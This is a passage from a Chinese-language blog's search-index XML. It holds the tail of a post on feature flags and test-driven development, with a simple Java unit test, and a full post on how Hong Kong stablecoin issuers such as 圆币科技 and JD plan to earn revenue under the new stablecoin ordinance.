<li>TDD（测试驱动开发）<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确做法：通过测试强制解耦</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">should_work_independently_of_data_model</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 给定旧数据模型</span></span><br><span class="line">    FeatureFlag.disable(<span class="string">&quot;new_data_model&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当启用新风控引擎</span></span><br><span class="line">    FeatureFlag.enable(<span class="string">&quot;new_risk_engine&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 那么系统仍应正常工作</span></span><br><span class="line">    assertThat(processTransaction(request)).isSuccessful();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
所有Flag相关代码必须满足：</li>
</ol>
<ul>
<li>独立单元测试覆盖率≥90%</li>
<li>集成测试验证Flag组合场景<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">        [End-to-End Tests]</span><br><span class="line">           /       \</span><br><span class="line">[Integration Tests] [Feature Flag交互测试]</span><br><span class="line">          \         /</span><br><span class="line">        [Unit Tests（强制隔离Flag）]</span><br></pre></td></tr></table></figure>
<h4 id="Google的实践经验​"><a href="#Google的实践经验​" class="headerlink" title=". Google的实践经验​"></a><strong>. Google的实践经验</strong>​</h4></li>
<li>每天主干分支接收 ​<strong>20,000+次提交</strong>​</li>
<li>通过<strong>Feature Flag + TDD</strong>实现：<ul>
<li>平均故障恢复时间（MTTR）&lt; 1小时</li>
<li>代码冲突率降低76%</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>架构模式</tag>
        <tag>产品设计</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>稳定币如何盈利</title>
    <url>/2025/06/24/%E7%A8%B3%E5%AE%9A%E5%B8%81%E5%A6%82%E4%BD%95%E7%9B%88%E5%88%A9/</url>
    <content><![CDATA[<p>随着香港《稳定币条例》将于2025年8月1日正式生效，稳定币市场正迎来分水岭时刻。圆币科技与京东作为首批进入香港金管局沙盒的机构，分别从本土金融创新与跨境电商场景切入，展现了稳定币在合规框架下的多元化可能性。本文将从<strong>战略定位、应用场景、技术路径</strong>三大维度，解析两家企业的差异化布局，并探讨其对全球支付体系的重构潜力。</p>
<h3 id="一、战略定位：合规先行的差异化路径"><a href="#一、战略定位：合规先行的差异化路径" class="headerlink" title="一、战略定位：合规先行的差异化路径"></a>一、战略定位：合规先行的差异化路径</h3><h4 id="1-​圆币科技：香港本土金融基建的“连接器”​​"><a href="#1-​圆币科技：香港本土金融基建的“连接器”​​" class="headerlink" title="1. ​圆币科技：香港本土金融基建的“连接器”​​"></a>1. ​<strong>圆币科技：香港本土金融基建的“连接器”​</strong>​</h4><ul>
<li>​<strong>监管协同优势</strong>​：由香港金管局前总裁陈德霖创立，圆币科技从成立之初便与监管机构保持紧密沟通，其港元稳定币HKDR以“全额抵押+独立托管”为核心，强调与传统金融体系的融合。例如，通过众安银行的储备银行服务及欧科云链的信托托管，构建合规闭环。</li>
<li>​<strong>多币种布局</strong>​：初期锚定港元，但预留离岸人民币（47%）、日元（32%）等一篮子货币扩展空间，以服务亚洲贸易企业的汇率风险管理需求。</li>
<li>收益方面，主要来自于底层资产所产生的利息。法案也有表述，<strong>稳定币储备资产产生的利息归发行方所有</strong>。<h4 id="2-​京东：跨境供应链的“效率引擎”​​"><a href="#2-​京东：跨境供应链的“效率引擎”​​" class="headerlink" title="2. ​京东：跨境供应链的“效率引擎”​​"></a>2. ​<strong>京东：跨境供应链的“效率引擎”​</strong>​</h4></li>
<li>​<strong>场景驱动逻辑</strong>​：京东稳定币（JD-HKD）直接服务于其全球电商与物流网络，目标是将跨境结算时间从3-7天缩短至分钟级，手续费降低90%以上。例如，东南亚供应商可通过链上智能合约实现“货到自动付款”。</li>
<li>​<strong>全球化野心</strong>​：依托香港牌照，采用“一地合规，多国联动”策略，未来可能联动数字人民币（e-CNY）探索更广泛的亚太市场。<h3 id="二、应用场景：从跨境支付到RWA的生态构建"><a href="#二、应用场景：从跨境支付到RWA的生态构建" class="headerlink" title="二、应用场景：从跨境支付到RWA的生态构建"></a>二、应用场景：从跨境支付到RWA的生态构建</h3><h4 id="1-​圆币科技的三大核心场景​"><a href="#1-​圆币科技的三大核心场景​" class="headerlink" title="1. ​圆币科技的三大核心场景​"></a>1. ​<strong>圆币科技的三大核心场景</strong>​</h4></li>
<li>​<strong>跨境支付</strong>​：聚焦香港与新兴市场间的贸易结算，尤其针对传统银行服务薄弱的地区（如非洲），稳定币可降低30%成本并提升40%效率。</li>
<li>​<strong>虚拟资产交易</strong>​：通过与HashKey交易所合作，为持牌平台提供合规交易对（Trading Pair），填补美元稳定币（如USDT）的监管空白。</li>
<li>​<strong>RWA（现实资产代币化）​</strong>​：推动房地产、债券等资产上链后的稳定币结算闭环，例如用港元稳定币完成链上产权交割。<h4 id="2-​京东的供应链金融整合​"><a href="#2-​京东的供应链金融整合​" class="headerlink" title="2. ​京东的供应链金融整合​"></a>2. ​<strong>京东的供应链金融整合</strong>​</h4></li>
<li>​<strong>B2B支付革命</strong>​：将稳定币嵌入供应商账期管理，通过智能合约自动释放货款，解决中小企业融资难问题。</li>
<li>​<strong>生态协同</strong>​：开放API接口吸引第三方商户，形成“支付-物流-数据”的区块链生态，与圆币的金融基建定位形成差异。<h3 id="三、技术架构与监管挑战"><a href="#三、技术架构与监管挑战" class="headerlink" title="三、技术架构与监管挑战"></a>三、技术架构与监管挑战</h3><h4 id="1-​公链选择与合规平衡​"><a href="#1-​公链选择与合规平衡​" class="headerlink" title="1. ​公链选择与合规平衡​"></a>1. ​<strong>公链选择与合规平衡</strong>​</h4></li>
<li>圆币首选以太坊发行HKDR，兼顾开发者生态与监管透明度要求，未来可能扩展至HashKey Chain等支付优化链。</li>
<li>京东同样基于以太坊技术，但强调与数字港币（e-HKD）的协同机制，例如储备金分级托管以符合香港《稳定币条例》的流动性要求。<h4 id="2-​风险防控的关键设计​"><a href="#2-​风险防控的关键设计​" class="headerlink" title="2. ​风险防控的关键设计​"></a>2. ​<strong>风险防控的关键设计</strong>​</h4></li>
<li>​<strong>脱锚风险</strong>​：圆币采用动态公示信托金额+月度审计，确保1:1足额抵押；京东则引入第三方实时监控储备金波动。</li>
<li>​<strong>反洗钱（AML）​</strong>​：两家企业均实施双重KYC认证（如圆币通过OneCash与欧科云链的双重验证），以符合香港金管局的严格标准。<h3 id="四、未来展望：互补共生的稳定币生态"><a href="#四、未来展望：互补共生的稳定币生态" class="headerlink" title="四、未来展望：互补共生的稳定币生态"></a>四、未来展望：互补共生的稳定币生态</h3></li>
</ul>
<ol>
<li>​<strong>CBDC与稳定币的协同</strong>​：如圆币CEO刘宇所言，香港的批发型CBDC（用于机构大额结算）与零售型稳定币将形成互补，而京东的稳定币可能成为连接数字人民币与跨境贸易的“中间层”。</li>
<li>​<strong>市场格局演变</strong>​：短期内，圆币凭借本土合规优势占据香港B2B支付市场，京东则需在供应链场景中证明规模效应；长期看，多币种稳定币（如离岸人民币）或成竞争焦点。</li>
</ol>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
</search>
